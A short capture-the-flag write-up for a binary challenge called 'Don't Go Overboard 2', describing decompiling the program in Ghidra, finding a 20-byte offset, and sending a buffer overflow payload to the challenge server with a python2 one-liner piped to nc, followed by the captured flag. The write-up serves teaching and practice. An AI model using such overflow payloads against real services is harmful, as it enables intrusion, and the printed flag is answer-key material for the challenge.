# Don't Go Overboard 2

***

<figure><img src="../../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

***

Basically this challenge is similar to Don’t Go Overboard. But this time, it checks the argument of address instead of decimal number.

So, I decompile the program using Ghidra.

Look at the main function. At line 16, it checks for address `0xf` and `0x405`.

<figure><img src="../../../.gitbook/assets/image (6) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

The technique is still the same, find the offset which i found is 20 bytes.

So, put the address together with the payload and send it to the program like this.

`python2 -c 'print "AAAAAAAAAAAAAAAAAAAAB\x00\x00\x00\x05\x04\x00\x00\x0f"' | nc 3.26.44.175 3335`

<figure><img src="../../../.gitbook/assets/image (7) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

***

### Flag

CURTIN\_CTF{P4YL04D\_0V3RF10W}
